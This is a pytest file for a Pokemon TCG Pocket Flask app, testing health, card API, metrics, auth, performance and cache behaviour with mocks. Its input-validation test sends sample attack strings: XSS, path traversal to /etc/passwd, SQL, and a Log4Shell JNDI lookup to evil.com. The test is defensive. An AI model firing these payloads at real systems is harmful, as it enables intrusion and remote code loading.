"""
Fast development tests for Pokemon TCG Pocket App.

This file contains essential tests that run quickly without Firebase emulator
for rapid feedback during development. These tests use mocked data only.

Target execution time: <5 seconds
Used for: Development branch pushes, Pull requests, Local development
"""

import pytest
import json
from unittest.mock import patch, Mock


@pytest.mark.unit
class TestHealthAndBasics:
    """Essential health and basic functionality tests."""
    
    def test_health_endpoint_exists(self, client):
        """Test that health endpoint is accessible."""
        response = client.get('/health')
        # Health endpoint should be accessible (200) or rate limited (429)
        assert response.status_code in [200, 429]
    
    def test_health_endpoint_returns_json(self, client):
        """Test that health endpoint returns proper JSON."""
        response = client.get('/health')
        data = json.loads(response.data)
        
        # Handle both successful and rate-limited responses
        if response.status_code == 200:
            assert 'status' in data
            assert 'timestamp' in data
            # Health status can be 'healthy', 'ok', or similar
            assert data['status'] in ['healthy', 'ok']
        elif response.status_code == 429:
            assert 'error' in data
            assert 'rate limit' in data['error'].lower()

    def test_app_starts_without_errors(self, client):
        """Test that the Flask app starts without errors."""
        response = client.get('/')
        # Should not be 500 (internal server error)
        assert response.status_code != 500


@pytest.mark.integration
class TestEssentialAPIEndpoints:
    """Test critical API endpoints with mocked data."""
    
    @patch('app.services.CardService.get_full_card_collection')
    def test_cards_api_basic_response(self, mock_collection, client, mock_card_data):
        """Test /api/cards returns proper format."""
        from Card import CardCollection, Card
        collection = CardCollection()
        for card_data in mock_card_data:
            card = Card(**card_data)
            collection.add_card(card)
        
        mock_collection.return_value = collection
        
        response = client.get('/api/cards')
        assert response.status_code == 200
        
        data = json.loads(response.data)
        assert isinstance(data, dict)
        assert 'cards' in data
        assert 'success' in data

    def test_metrics_endpoint(self, client):
        """Test metrics endpoint is accessible."""
        response = client.get('/metrics')
        # Metrics endpoint should be accessible or rate limited
        assert response.status_code in [200, 429]
        
        if response.status_code == 200:
            data = json.loads(response.data)
            assert 'cache_stats' in data or 'timestamp' in data
        # If rate limited, that's also acceptable for this test

    def test_authentication_endpoints_exist(self, client):
        """Test that authentication-related endpoints exist."""
        # Test that auth routes are registered (even if they redirect/error)
        response = client.get('/auth/')
        # Should not be 500 (internal server error) - any other response is fine
        assert response.status_code != 500
        
        # The auth routes should be properly registered in the app
        with client.application.app_context():
            # Check that auth blueprint is registered
            assert 'auth' in client.application.blueprints


@pytest.mark.security
class TestBasicSecurity:
    """Essential security tests that run quickly."""
    
    def test_no_debug_info_leaked(self, client):
        """Test that debug information is not leaked in responses."""
        response = client.get('/nonexistent-endpoint')
        
        # Should return 404, not expose debug info
        assert response.status_code == 404
        
        # Check response doesn't contain debug traces
        response_text = response.get_data(as_text=True)
        assert 'Traceback' not in response_text
        assert 'werkzeug' not in response_text.lower()

    def test_health_endpoint_no_sensitive_data(self, client):
        """Test health endpoint doesn't expose sensitive information."""
        response = client.get('/health')
        data = json.loads(response.data)
        
        # Ensure no sensitive keys are exposed
        sensitive_keys = ['secret', 'password', 'key', 'token', 'credential']
        data_str = json.dumps(data).lower()
        
        for key in sensitive_keys:
            assert key not in data_str, f"Sensitive key '{key}' found in health response"

    def test_basic_input_validation(self, client):
        """Test basic input validation on API endpoints."""
        # Test with malicious-looking input
        malicious_inputs = [
            '<script>alert("xss")</script>',
            '../../etc/passwd',
            'SELECT * FROM users',
            '${jndi:ldap://evil.com/a}'
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f'/api/cards?search={malicious_input}')
            # Should not return 500 (internal server error)
            assert response.status_code != 500


@pytest.mark.performance
class TestBasicPerformance:
    """Basic performance tests for development feedback."""
    
    def test_health_endpoint_response_time(self, client):
        """Test health endpoint responds quickly."""
        import time
        
        start = time.time()
        response = client.get('/health')
        end = time.time()
        
        response_time = end - start
        
        # Health endpoint should be accessible or rate limited
        assert response.status_code in [200, 429]
        # Health endpoint should respond in under 1 second regardless of status
        assert response_time < 1.0, f"Health endpoint too slow: {response_time:.2f}s"

    @patch('app.services.CardService.get_full_card_collection')
    def test_basic_api_performance(self, mock_collection, client, mock_card_data):
        """Test basic API performance with mocked data."""
        import time
        from Card import CardCollection, Card
        
        # Create small test collection
        collection = CardCollection()
        for card_data in mock_card_data[:5]:  # Only 5 cards for speed
            card = Card(**card_data)
            collection.add_card(card)
        
        mock_collection.return_value = collection
        
        start = time.time()
        response = client.get('/api/cards')
        end = time.time()
        
        response_time = end - start
        
        assert response.status_code == 200
        # API should respond quickly with mocked data
        assert response_time < 2.0, f"API too slow: {response_time:.2f}s"

    def test_concurrent_health_checks(self, client):
        """Test multiple concurrent health checks don't cause issues."""
        import threading
        import time
        
        results = []
        
        def health_check():
            start = time.time()
            response = client.get('/health')
            end = time.time()
            results.append({
                'status_code': response.status_code,
                'response_time': end - start
            })
        
        # Run 3 concurrent health checks (reduced to avoid rate limits)
        threads = []
        for _ in range(3):
            thread = threading.Thread(target=health_check)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All should complete
        assert len(results) == 3
        for result in results:
            # Should be successful or rate limited
            assert result['status_code'] in [200, 429]
            assert result['response_time'] < 2.0


@pytest.mark.unit
class TestCacheBasics:
    """Basic cache functionality tests."""
    
    def test_cache_manager_initialization(self, cache_manager):
        """Test cache manager can initialize."""
        assert cache_manager is not None
        # Basic functionality test - should not crash
        assert hasattr(cache_manager, 'set_user_data')
        assert hasattr(cache_manager, 'get_user_data')

    def test_basic_cache_operations(self, cache_manager, mock_user_data):
        """Test basic cache set/get operations."""
        user_id = "test-user-fast"
        
        # Should not crash on set
        try:
            success = cache_manager.set_user_data(user_id, mock_user_data, ttl_minutes=1)
            # If cache works, should return True or at least not crash
            assert success is True or success is None
        except Exception:
            # If cache is not available, should gracefully handle
            pass
        
        # Should not crash on get
        try:
            data = cache_manager.get_user_data(user_id)
            # Should return data or None, not crash
            assert data is None or isinstance(data, dict)
        except Exception:
            # If cache is not available, should gracefully handle  
            pass


@pytest.mark.unit
class TestConfigurationAndSetup:
    """Test app configuration and setup."""
    
    def test_app_config_loaded(self, app):
        """Test that app configuration is loaded correctly."""
        assert app.config['TESTING'] is True
        assert 'SECRET_KEY' in app.config
        assert app.config['SECRET_KEY'] is not None

    def test_required_environment_variables(self):
        """Test that required environment variables are set for testing."""
        import os
        
        required_vars = [
            'FLASK_CONFIG',
            'SECRET_KEY', 
            'GCP_PROJECT_ID'
        ]
        
        for var in required_vars:
            assert var in os.environ, f"Required environment variable {var} not set"
            assert os.environ[var] is not None, f"Environment variable {var} is None"

    def test_flask_app_factory(self, app):
        """Test Flask app factory pattern works."""
        assert app is not None
        assert app.config is not None
        assert hasattr(app, 'test_client')